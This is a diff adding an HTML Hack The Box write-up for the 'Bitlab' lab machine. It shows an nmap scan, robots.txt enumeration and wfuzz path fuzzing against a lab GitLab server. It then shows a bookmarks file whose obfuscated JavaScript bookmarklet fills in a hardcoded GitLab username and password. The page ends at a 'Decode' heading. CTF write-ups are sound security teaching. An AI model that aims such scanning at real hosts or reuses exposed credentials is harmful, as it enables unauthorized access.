@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>[HTB] Bitlab Writeup</title><link rel="stylesheet" type="text/css" href="/assets/main-dark.css"></head>
+<body>
+    <div class="container"><header>
+  <div class="menu">
+    <ul><li><a href="/">Index of /</a></li><li><a href="/about.html">| Biz Kimiz</a></li><li><a href="/writeup.html">| Writeup</a></li><li><a href="/red.html">| Red Team</a></li><li><a href="/blue.html">| Blue Team</a></li></ul>
+  </div>
+</header>
+<main>
+      <hr />
+<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~  nmap <span class="nt">-sS</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p-</span> <span class="nt">-A</span> <span class="nt">-O</span> 10.10.10.114
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2019-11-15 21:56 +03
+Nmap scan report <span class="k">for </span>10.10.10.114
+Host is up <span class="o">(</span>0.062s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65533 filtered ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 a2:3b:b0:dd:28:91:bf:e8:f9:30:82:31:23:2f:92:18 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 e6:3b:fb:b3:7f:9a:35:a8:bd:d0:27:7b:25:d4:ed:dc <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 c9:54:3d:91:01:78:03:ab:16:14:6b:cc:f0:b7:3a:55 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    nginx
+| http-robots.txt: 55 disallowed entries <span class="o">(</span>15 shown<span class="o">)</span>
+| / /autocomplete/users /search /api /admin /profile 
+| /dashboard /projects/new /groups/new /groups/<span class="k">*</span>/edit /users /help 
+|_/s/ /snippets/new /snippets/<span class="k">*</span>/edit
+| http-title: Sign <span class="k">in</span> <span class="se">\x</span>C2<span class="se">\x</span>B7 GitLab
+|_Requested resource was http://10.10.10.114/users/sign_in
+|_http-trane-info: Problem with XML parsing of /evox/about
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 3.10 - 4.11 <span class="o">(</span>92%<span class="o">)</span>, Linux 3.18 <span class="o">(</span>92%<span class="o">)</span>, Linux 3.2 - 4.9 <span class="o">(</span>92%<span class="o">)</span>, Crestron XPanel control system <span class="o">(</span>90%<span class="o">)</span>, Linux 3.16 <span class="o">(</span>89%<span class="o">)</span>, ASUS RT-N56U WAP <span class="o">(</span>Linux 3.4<span class="o">)</span> <span class="o">(</span>87%<span class="o">)</span>, Linux 3.1 <span class="o">(</span>87%<span class="o">)</span>, Linux 3.2 <span class="o">(</span>87%<span class="o">)</span>, HP P2000 G3 NAS device <span class="o">(</span>87%<span class="o">)</span>, AXIS 210A or 211 Network Camera <span class="o">(</span>Linux 2.6.17<span class="o">)</span> <span class="o">(</span>87%<span class="o">)</span>
+No exact OS matches <span class="k">for </span>host <span class="o">(</span><span class="nb">test </span>conditions non-ideal<span class="o">)</span><span class="nb">.</span>
+Network Distance: 2 hops
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE <span class="o">(</span>using port 22/tcp<span class="o">)</span>
+HOP RTT      ADDRESS
+1   63.62 ms 10.10.14.1
+2   63.67 ms 10.10.10.114
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>257.23 seconds
+</code></pre></div></div>
+<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~  curl <span class="nt">-s</span> 10.10.10.114/robots.txt 
+<span class="c"># See http://www.robotstxt.org/robotstxt.html for documentation on how to use the robots.txt file</span>
+<span class="c">#</span>
+<span class="c"># To ban all spiders from the entire site uncomment the next two lines:</span>
+<span class="c"># User-Agent: *</span>
+<span class="c"># Disallow: /</span>
+
+<span class="c"># Add a 1 second delay between successive requests to the same server, limits resources used by crawler</span>
+<span class="c"># Only some crawlers respect this setting, e.g. Googlebot does not</span>
+<span class="c"># Crawl-delay: 1</span>
+
+<span class="c"># Based on details in https://gitlab.com/gitlab-org/gitlab-ce/blob/master/config/routes.rb, https://gitlab.com/gitlab-org/gitlab-ce/blob/master/spec/routing, and using application</span>
+User-Agent: <span class="k">*</span>
+Disallow: /autocomplete/users
+Disallow: /search
+Disallow: /api
+Disallow: /admin
+Disallow: /profile
+Disallow: /dashboard
+Disallow: /projects/new
+Disallow: /groups/new
+Disallow: /groups/<span class="k">*</span>/edit
+Disallow: /users
+Disallow: /help
+<span class="c"># Only specifically allow the Sign In page to avoid very ugly search results</span>
+Allow: /users/sign_in
+
+<span class="c"># Global snippets</span>
+User-Agent: <span class="k">*</span>
+Disallow: /s/
+Disallow: /snippets/new
+Disallow: /snippets/<span class="k">*</span>/edit
+Disallow: /snippets/<span class="k">*</span>/raw
+
+<span class="c"># Project details</span>
+User-Agent: <span class="k">*</span>
+Disallow: /<span class="k">*</span>/<span class="k">*</span>.git
+Disallow: /<span class="k">*</span>/<span class="k">*</span>/fork/new
+Disallow: /<span class="k">*</span>/<span class="k">*</span>/repository/archive<span class="k">*</span>
+Disallow: /<span class="k">*</span>/<span class="k">*</span>/activity
+Disallow: /<span class="k">*</span>/<span class="k">*</span>/new
+Disallow: /<span class="k">*</span>/<span class="k">*</span>/edit
+Disallow: /<span class="k">*</span>/<span class="k">*</span>/raw
+Disallow: /<span class="k">*</span>/<span class="k">*</span>/blame
+Disallow: /<span class="k">*</span>/<span class="k">*</span>/commits/<span class="k">*</span>/<span class="k">*</span>
+Disallow: /<span class="k">*</span>/<span class="k">*</span>/commit/<span class="k">*</span>.patch
+Disallow: /<span class="k">*</span>/<span class="k">*</span>/commit/<span class="k">*</span>.diff
+Disallow: /<span class="k">*</span>/<span class="k">*</span>/compare
+Disallow: /<span class="k">*</span>/<span class="k">*</span>/branches/new
+Disallow: /<span class="k">*</span>/<span class="k">*</span>/tags/new
+Disallow: /<span class="k">*</span>/<span class="k">*</span>/network
+Disallow: /<span class="k">*</span>/<span class="k">*</span>/graphs
+Disallow: /<span class="k">*</span>/<span class="k">*</span>/milestones/new
+Disallow: /<span class="k">*</span>/<span class="k">*</span>/milestones/<span class="k">*</span>/edit
+Disallow: /<span class="k">*</span>/<span class="k">*</span>/issues/new
+Disallow: /<span class="k">*</span>/<span class="k">*</span>/issues/<span class="k">*</span>/edit
+Disallow: /<span class="k">*</span>/<span class="k">*</span>/merge_requests/new
+Disallow: /<span class="k">*</span>/<span class="k">*</span>/merge_requests/<span class="k">*</span>.patch
+Disallow: /<span class="k">*</span>/<span class="k">*</span>/merge_requests/<span class="k">*</span>.diff
+Disallow: /<span class="k">*</span>/<span class="k">*</span>/merge_requests/<span class="k">*</span>/edit
+Disallow: /<span class="k">*</span>/<span class="k">*</span>/merge_requests/<span class="k">*</span>/diffs
+Disallow: /<span class="k">*</span>/<span class="k">*</span>/project_members/import
+Disallow: /<span class="k">*</span>/<span class="k">*</span>/labels/new
+Disallow: /<span class="k">*</span>/<span class="k">*</span>/labels/<span class="k">*</span>/edit
+Disallow: /<span class="k">*</span>/<span class="k">*</span>/wikis/<span class="k">*</span>/edit
+Disallow: /<span class="k">*</span>/<span class="k">*</span>/snippets/new
+Disallow: /<span class="k">*</span>/<span class="k">*</span>/snippets/<span class="k">*</span>/edit
+Disallow: /<span class="k">*</span>/<span class="k">*</span>/snippets/<span class="k">*</span>/raw
+Disallow: /<span class="k">*</span>/<span class="k">*</span>/deploy_keys
+Disallow: /<span class="k">*</span>/<span class="k">*</span>/hooks
+Disallow: /<span class="k">*</span>/<span class="k">*</span>/services
+Disallow: /<span class="k">*</span>/<span class="k">*</span>/protected_branches
+Disallow: /<span class="k">*</span>/<span class="k">*</span>/uploads/
+Disallow: /<span class="k">*</span>/-/group_members
+Disallow: /<span class="k">*</span>/project_members
+</code></pre></div></div>
+<hr />
+<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~  curl <span class="nt">-s</span> 10.10.10.114/robots.txt  | <span class="nb">awk</span> <span class="s1">'{print $2}'</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s1">'/'</span> <span class="nt">-f2</span> | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"*"</span> | wfuzz <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">-c</span> <span class="nt">-z</span> stdin http://10.10.10.114/FUZZ
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz<span class="s1">'s documentation for more information.
+
+********************************************************
+* Wfuzz 2.4 - The Web Fuzzer                           *
+********************************************************
+
+Target: http://10.10.10.114/FUZZ
+Total requests: &lt;&lt;unknown&gt;&gt;
+
+===================================================================
+ID           Response   Lines    Word     Chars       Payload                                                                                                       
+===================================================================
+
+000000002:   302        0 L      5 W      99 Ch       ""                                                                                                            
+000000001:   302        0 L      5 W      99 Ch       "See"                                                                                                         
+000000010:   302        0 L      5 W      99 Ch       ""                                                                                                            
+000000005:   302        0 L      5 W      99 Ch       "Disallow:"                                                                                                   
+000000003:   302        0 L      5 W      99 Ch       "To"                                                                                                          
+000000004:   302        0 L      5 W      99 Ch       "User-Agent:"                                                                                                 
+000000006:   302        0 L      5 W      99 Ch       ""                                                                                                            
+000000016:   301        7 L      20 W     236 Ch      "profile"                                                                                                     
+000000008:   302        0 L      5 W      99 Ch       "Only"                                                                                                        
+000000009:   302        0 L      5 W      99 Ch       "Crawl-delay:"                                                                                                
+000000007:   302        0 L      5 W      99 Ch       "Add"                                                                                                         
+000000012:   302        0 L      5 W      99 Ch       "autocomplete"                                                                                                
+000000011:   302        0 L      5 W      99 Ch       "Based"                                                                                                       
+000000014:   302        0 L      5 W      99 Ch       "api"                                                                                                         
+000000022:   301        7 L      20 W     233 Ch      "help"                                                                                                        
+000000015:   302        0 L      5 W      99 Ch       "admin"                                                                                                       
+000000017:   302        0 L      5 W      99 Ch       "dashboard"                                                                                                   
+000000018:   302        0 L      5 W      93 Ch       "projects"                                                                                                    
+000000019:   302        0 L      5 W      100 Ch      "groups"                                                                                                      
+000000021:   302        0 L      5 W      99 Ch       "users"                                                                                                       
+000000020:   302        0 L      5 W      100 Ch      "groups"                                                                                                      
+000000023:   302        0 L      5 W      99 Ch       "Only"                                                                                                        
+000000024:   302        0 L      5 W      99 Ch       "users"                                                                                                       
+000000025:   302        0 L      5 W      99 Ch       ""                                                                                                            
+000000026:   302        0 L      5 W      99 Ch       "Global"                                                                                                      
+000000027:   302        0 L      5 W      99 Ch       "s"                                                                                                           
+000000028:   302        0 L      5 W      102 Ch      "snippets"                                                                                                    
+000000029:   302        0 L      5 W      102 Ch      "snippets"                                                                                                    
+000000030:   302        0 L      5 W      102 Ch      "snippets"                                                                                                    
+000000031:   302        0 L      5 W      99 Ch       ""                                                                                                            
+000000032:   302        0 L      5 W      99 Ch       "Project"                                                                                                     
+000000013:   200        217 L    765 W    13074 Ch    "search"                                                                                                      
+
+Total time: 1.775532
+Processed Requests: 32
+Filtered Requests: 0
+Requests/sec.: 18.02276
+
+</span></code></pre></div></div>
+<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~  curl <span class="nt">-s</span> http://10.10.10.114/help/
+</code></pre></div></div>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN"&gt;</span>
+<span class="nt">&lt;html&gt;</span>
+ <span class="nt">&lt;head&gt;</span>
+  <span class="nt">&lt;title&gt;</span>Index of /help<span class="nt">&lt;/title&gt;</span>
+ <span class="nt">&lt;/head&gt;</span>
+ <span class="nt">&lt;body&gt;</span>
+<span class="nt">&lt;h1&gt;</span>Index of /help<span class="nt">&lt;/h1&gt;</span>
+  <span class="nt">&lt;table&gt;</span>
+   <span class="nt">&lt;tr&gt;&lt;th</span> <span class="na">valign=</span><span class="s">"top"</span><span class="nt">&gt;&lt;img</span> <span class="na">src=</span><span class="s">"/icons/blank.gif"</span> <span class="na">alt=</span><span class="s">"[ICO]"</span><span class="nt">&gt;&lt;/th&gt;&lt;th&gt;&lt;a</span> <span class="na">href=</span><span class="s">"?C=N;O=D"</span><span class="nt">&gt;</span>Name<span class="nt">&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a</span> <span class="na">href=</span><span class="s">"?C=M;O=A"</span><span class="nt">&gt;</span>Last modified<span class="nt">&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a</span> <span class="na">href=</span><span class="s">"?C=S;O=A"</span><span class="nt">&gt;</span>Size<span class="nt">&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a</span> <span class="na">href=</span><span class="s">"?C=D;O=A"</span><span class="nt">&gt;</span>Description<span class="nt">&lt;/a&gt;&lt;/th&gt;&lt;/tr&gt;</span>
+   <span class="nt">&lt;tr&gt;&lt;th</span> <span class="na">colspan=</span><span class="s">"5"</span><span class="nt">&gt;&lt;hr&gt;&lt;/th&gt;&lt;/tr&gt;</span>
+<span class="nt">&lt;tr&gt;&lt;td</span> <span class="na">valign=</span><span class="s">"top"</span><span class="nt">&gt;&lt;img</span> <span class="na">src=</span><span class="s">"/icons/back.gif"</span> <span class="na">alt=</span><span class="s">"[PARENTDIR]"</span><span class="nt">&gt;&lt;/td&gt;&lt;td&gt;&lt;a</span> <span class="na">href=</span><span class="s">"/"</span><span class="nt">&gt;</span>Parent Directory<span class="nt">&lt;/a&gt;&lt;/td&gt;&lt;td&gt;</span><span class="ni">&amp;nbsp;</span><span class="nt">&lt;/td&gt;&lt;td</span> <span class="na">align=</span><span class="s">"right"</span><span class="nt">&gt;</span>  - <span class="nt">&lt;/td&gt;&lt;td&gt;</span><span class="ni">&amp;nbsp;</span><span class="nt">&lt;/td&gt;&lt;/tr&gt;</span>
+<span class="nt">&lt;tr&gt;&lt;td</span> <span class="na">valign=</span><span class="s">"top"</span><span class="nt">&gt;&lt;img</span> <span class="na">src=</span><span class="s">"/icons/text.gif"</span> <span class="na">alt=</span><span class="s">"[TXT]"</span><span class="nt">&gt;&lt;/td&gt;&lt;td&gt;&lt;a</span> <span class="na">href=</span><span class="s">"bookmarks.html"</span><span class="nt">&gt;</span>bookmarks.html<span class="nt">&lt;/a&gt;&lt;/td&gt;&lt;td</span> <span class="na">align=</span><span class="s">"right"</span><span class="nt">&gt;</span>2019-07-30 12:46  <span class="nt">&lt;/td&gt;&lt;td</span> <span class="na">align=</span><span class="s">"right"</span><span class="nt">&gt;</span>4.4K<span class="nt">&lt;/td&gt;&lt;td&gt;</span><span class="ni">&amp;nbsp;</span><span class="nt">&lt;/td&gt;&lt;/tr&gt;</span>
+   <span class="nt">&lt;tr&gt;&lt;th</span> <span class="na">colspan=</span><span class="s">"5"</span><span class="nt">&gt;&lt;hr&gt;&lt;/th&gt;&lt;/tr&gt;</span>
+<span class="nt">&lt;/table&gt;</span>
+<span class="nt">&lt;/body&gt;&lt;/html&gt;</span>
+</code></pre></div></div>
+<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~  curl <span class="nt">-s</span> http://10.10.10.114/help/bookmarks.html
+</code></pre></div></div>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE NETSCAPE-Bookmark-file-1&gt;</span>
+<span class="c">&lt;!-- This is an automatically generated file.
+     It will be read and overwritten.
+     DO NOT EDIT! --&gt;</span>
+<span class="nt">&lt;META</span> <span class="na">HTTP-EQUIV=</span><span class="s">"Content-Type"</span> <span class="na">CONTENT=</span><span class="s">"text/html; charset=UTF-8"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;TITLE&gt;</span>Bookmarks<span class="nt">&lt;/TITLE&gt;</span>
+<span class="nt">&lt;H1&gt;</span>Bookmarks<span class="nt">&lt;/H1&gt;</span>
+<span class="nt">&lt;DL&gt;&lt;p&gt;</span>
+    <span class="nt">&lt;DT&gt;&lt;H3</span> <span class="na">ADD_DATE=</span><span class="s">"1564422476"</span> <span class="na">LAST_MODIFIED=</span><span class="s">"0"</span> <span class="na">PERSONAL_TOOLBAR_FOLDER=</span><span class="s">"true"</span><span class="nt">&gt;</span>Bookmarks bar<span class="nt">&lt;/H3&gt;</span>
+    <span class="nt">&lt;DL&gt;&lt;p&gt;</span>
+        <span class="nt">&lt;DT&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">"https://www.hackthebox.eu/"</span> <span class="na">ADD_DATE=</span><span class="s">"1554931938"</span> <span class="na">ICON=</span><span class="s">"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACuklEQVQ4jW2Tz2tcdRTFP+d+33szmUlGjCh0pppQrQYLlcaiRloxi2zERUUR7FYXutCVC/8AFy7MRkHc+B+04EqQLiIqKCqiBSUKRqLplCyMZl7n13vzvtfFi6Vg7/bcc7jcc46oR4ADdO87cS6YXna0jtM7Qq8J36qif9T/Y+fLWzni5nRbx5fa78h4VZBCRKpF3REYDqVHPtzbHb4F/dF/Ktbtdpsha31swTbwKsZKcTrGZqUEkKTujTmiBTcULFbxSjHOn9vf3x8HwO9YvGczJOGlWVFNh7lCkrk9sDrT+sUxp84VxEo62DcbDkQIsUjS8KAsXRgc/v2Jer3lJyxLv4gzp9WJtroxVe+hGdOh+P1qKoDl06XPzTt72wnfX2n4aGDREhGL8nzo3HXn20nQ6vBQ8ckLE3v2tRHTkfju06auftbw6zsJFtDK4yWPPTPl8ED65dvM51qeRHmaCFt33EHWbMOlzTa7PyV66sWJn39hIoC/rptf2mxr+dTMO3dHBOa4C1tPhI65O4AEhAA7P6T+6zepnn9zCMDld9tKMvzE6RLVf5U7CB1L3GsiR0GwAK2OEyNURY3MLzpmNVYbe7TvyJD3JXDHZc44F6OBhOMWbpJ8NJDGuUBe7wqQ982JW6qPiOVEnNmYcvJs6ZOhNL4hH9+QT4bSybOln9koKKcARCE5cUu93tKaZdnnsXIac9EeebrQylrBZCgWFuuk5gfyZtvZ/jrjx63Mp2OLFmobBXB86f73Qgivz2bVdJwrTTJ078qMh9cKAH7+KuPP7YSqxJvzXiZJaFRV9f7e7m9v/C/K7lV0VyxGbmVpAkjT6FlLUXLTUZSrYnSh3+9PAuB5npeDf5qXFzppB+lRoTRJUTbnZE0nSWVC5mgWKz7Y2x29kuf90a1tvE2dWcd1VGe/Jrhtnf8FOj1caqcXEh4AAAAASUVORK5CYII="</span><span class="nt">&gt;</span>Hack The Box :: Penetration Testing Labs<span class="nt">&lt;/A&gt;</span>
+        <span class="nt">&lt;DT&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">"https://www.docker.com/"</span> <span class="na">ADD_DATE=</span><span class="s">"1554931981"</span> <span class="na">ICON=</span><span class="s">"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACE0lEQVQ4jbWTu2tUURDGf3P23JvdKxvRGIwEA1okmNSWAcFCBIs0+QfEF0hsFFtPwNIHKFosWGhhYbCzEERMQCIoiBYJCpEYAxJNk6e5u3vOGYtdkvVBsPGDYZhhHh/fnAPbwTmDU7Ntzf/Fva/XqMzfBmQz9xsj2/SCKoyOClP9wsC0MtUvxHgAKIETuAKI4iS2DpDWgMr8LXxtEGNnIOxDzCJSSDiz/wQAR15YhjqPsjTwDCcRp8bi1NDxsYtAmVp1FfQLhG8QFJF1qCdcf9dLVlonD3sp736K/XQWqOAkNhjcmbmKMILyHGO6sckc3ndTsMugBqULa2dZWRtlR+kN+foiWft7fHW8wN2Z40AvsIzIEkoOugaaI6wSwwYavhPjEhI68dVBitkuNPbg/RML5j7W7EHjDzQmiEQ0GiASQ1MjUTQakmJKqEP0F1nJH3J5YMFC/EyIHfhahgioyqa82qqw1kmzgJjXnDt4o3FSZywhvKSteJh6rYaQILLVJpvbA6ZgEfGE/BIgDKvBSTBAhRBWSNtSotYBj2qLRUizhDTboFo9xflDk6AwJgHAMNL3Ae9PkhQXyMoppfaErD0h29nwSRoQM0EtH+JC3wOcM7DF0qIqiDzm5vQkxdIxfN6HUqYgG2DnSJNXnO55i5tta9b+8hKb+qj8mfw3tDSq8IjmRxkDhmF6XGAi4txftjbwE2NZ43Pq//CoAAAAAElFTkSuQmCC"</span><span class="nt">&gt;</span>Enterprise Application Container Platform | Docker<span class="nt">&lt;/A&gt;</span>
+        <span class="nt">&lt;DT&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">"https://www.php.net/"</span> <span class="na">ADD_DATE=</span><span class="s">"1554931999"</span> <span class="na">ICON=</span><span class="s">"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAAb0lEQVQ4jWNsaDjAQApgIkk1ORpY0Pjh4eIQxsqVL4m1QVNTk4ANWE0NDxeHcNFlr1+/Dld0/fp1glwmZA7cMXi4dAtWiHXILkYGyLIscFcywMLh+vXrcAamLMJJ8DDFZCCzmfC4BNl4OGCkeWoFAHM4Vw1BMLruAAAAAElFTkSuQmCC"</span><span class="nt">&gt;</span>PHP: Hypertext Preprocessor<span class="nt">&lt;/A&gt;</span>
+        <span class="nt">&lt;DT&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">"https://nodejs.org/en/"</span> <span class="na">ADD_DATE=</span><span class="s">"1554932008"</span> <span class="na">ICON=</span><span class="s">"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAC1UlEQVQ4jW2TT4iVVRjGn+c957vfnWlmuNZgKCkEhS7cmSS2aTe00M0wQn9IsRSCIMyFMbgqdKVtok2Bi1EQvAspMHATbVwWLQpiQKjUHJs7c6/3u/f77vfvPC6u84forA6H933Oy/vjB2w7CzcX3Mb9/A/vv3Xh9plfz9489cvpq+/M/V8NAHD8CNc+jhoAPr4zv3+SzUVfR++ZYpZ5QL+fBzNcQ8Clr08sLW8EtY+3a24kvXv99ZnZl3afi0L86WQ8OVX1glR5hYoYpgVdw5G1EiOv9P7ufHn1/PfJ5gSnb8/NT+2ILkZuYl8YGFzdKK00jxChLoCiCMiyvPLeR1PTTSDojxpavDz/7S1789zR2ezfaMk89+XDsgxBAuApEgGEQICE0RdlqUE/K513+//pdJbwwczztucVb3XSHKaPGczDAQQkwiAYRKMAiQLrOkCC6z4ZhIdrnfTgnlfNWvFIzThivtY0lQAgApSe/S6BBEmjyrpmFYIe9boWAtiabcl6+SyjmLQ6QtH3NAcoiOQ2TAAUSEDoDRKm+QjeO/Y6PRqeG8AZETUMf/71BEUeYEZIgKQt3hSMRFYV8GaILQKmpmGjaiQfU0kxxOp6X49XUjhPSALJbSGERIBQpRrNhlerSGXNVpMZ07Cy3g2NhuejlUSDtJD3JkHjJRICJFCiyKwqQgjSzhdepE3s7YYHq+szRajNOauKssKDhz2ajTEqiAgaoxxvo3beLCmy6coVwb557ae1pFueNPKei13U8I4rnaTqDTK5yCRKGk9QEaSfiCIG3Cvq6mT7wztdBwD3f7z/+643dl8nANIOoWGNPCuxq7VDdQXUQXSxd6Msz7O8uDJYzU7c/fzuz1uUFuDQHst05OKRA867xVCFtw+8vBc7p1sYpgVGo/JGkiaXrn1067f/9myZuYBNVQ9/cfjY0a/mlj/77szyJzdOHdvUeVyzKeFT9k18v9LwrSUAAAAASUVORK5CYII="</span><span class="nt">&gt;</span>Node.js<span class="nt">&lt;/A&gt;</span>
+        <span class="nt">&lt;DT&gt;&lt;A</span> <span class="na">HREF=</span><span class="s">"javascript:(function(){ var _0x4b18=[&amp;quot;\x76\x61\x6C\x75\x65&amp;quot;,&amp;quot;\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E&amp;quot;,&amp;quot;\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64&amp;quot;,&amp;quot;\x63\x6C\x61\x76\x65&amp;quot;,&amp;quot;\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64&amp;quot;,&amp;quot;\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78&amp;quot;];document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]]= _0x4b18[3];document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]]= _0x4b18[5]; })()"</span> <span class="na">ADD_DATE=</span><span class="s">"1554932142"</span><span class="nt">&gt;</span>Gitlab Login<span class="nt">&lt;/A&gt;</span>
+    <span class="nt">&lt;/DL&gt;&lt;p&gt;</span>
+<span class="nt">&lt;/DL&gt;&lt;p&gt;</span>
+
+</code></pre></div></div>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="nx">javascript</span><span class="p">:(</span><span class="kd">function</span><span class="p">(){</span> <span class="kd">var</span> <span class="nx">_0x4b18</span><span class="o">=</span><span class="p">[</span><span class="dl">"</span><span class="se">\</span><span class="s2">x76</span><span class="se">\</span><span class="s2">x61</span><span class="se">\</span><span class="s2">x6C</span><span class="se">\</span><span class="s2">x75</span><span class="se">\</span><span class="s2">x65</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="se">\</span><span class="s2">x75</span><span class="se">\</span><span class="s2">x73</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x72</span><span class="se">\</span><span class="s2">x5F</span><span class="se">\</span><span class="s2">x6C</span><span class="se">\</span><span class="s2">x6F</span><span class="se">\</span><span class="s2">x67</span><span class="se">\</span><span class="s2">x69</span><span class="se">\</span><span class="s2">x6E</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="se">\</span><span class="s2">x67</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x45</span><span class="se">\</span><span class="s2">x6C</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x6D</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x6E</span><span class="se">\</span><span class="s2">x74</span><span class="se">\</span><span class="s2">x42</span><span class="se">\</span><span class="s2">x79</span><span class="se">\</span><span class="s2">x49</span><span class="se">\</span><span class="s2">x64</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="se">\</span><span class="s2">x63</span><span class="se">\</span><span class="s2">x6C</span><span class="se">\</span><span class="s2">x61</span><span class="se">\</span><span class="s2">x76</span><span class="se">\</span><span class="s2">x65</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="se">\</span><span class="s2">x75</span><span class="se">\</span><span class="s2">x73</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x72</span><span class="se">\</span><span class="s2">x5F</span><span class="se">\</span><span class="s2">x70</span><span class="se">\</span><span class="s2">x61</span><span class="se">\</span><span class="s2">x73</span><span class="se">\</span><span class="s2">x73</span><span class="se">\</span><span class="s2">x77</span><span class="se">\</span><span class="s2">x6F</span><span class="se">\</span><span class="s2">x72</span><span class="se">\</span><span class="s2">x64</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="se">\</span><span class="s2">x31</span><span class="se">\</span><span class="s2">x31</span><span class="se">\</span><span class="s2">x64</span><span class="se">\</span><span class="s2">x65</span><span class="se">\</span><span class="s2">x73</span><span class="se">\</span><span class="s2">x30</span><span class="se">\</span><span class="s2">x30</span><span class="se">\</span><span class="s2">x38</span><span class="se">\</span><span class="s2">x31</span><span class="se">\</span><span class="s2">x78</span><span class="dl">"</span><span class="p">];</span><span class="nb">document</span><span class="p">[</span><span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">2</span><span class="p">]](</span><span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">1</span><span class="p">])[</span><span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span><span class="o">=</span> <span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span><span class="nb">document</span><span class="p">[</span><span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">2</span><span class="p">]](</span><span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">4</span><span class="p">])[</span><span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">0</span><span class="p">]]</span><span class="o">=</span> <span class="nx">_0x4b18</span><span class="p">[</span><span class="mi">5</span><span class="p">];</span> <span class="p">})()</span>
+</code></pre></div></div>
+<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">---------------------------------------------------------------------------</span>
+<span class="c"># Decode; </span>
+<span class="nt">---------------------------------------------------------------------------</span>
+</code></pre></div></div>
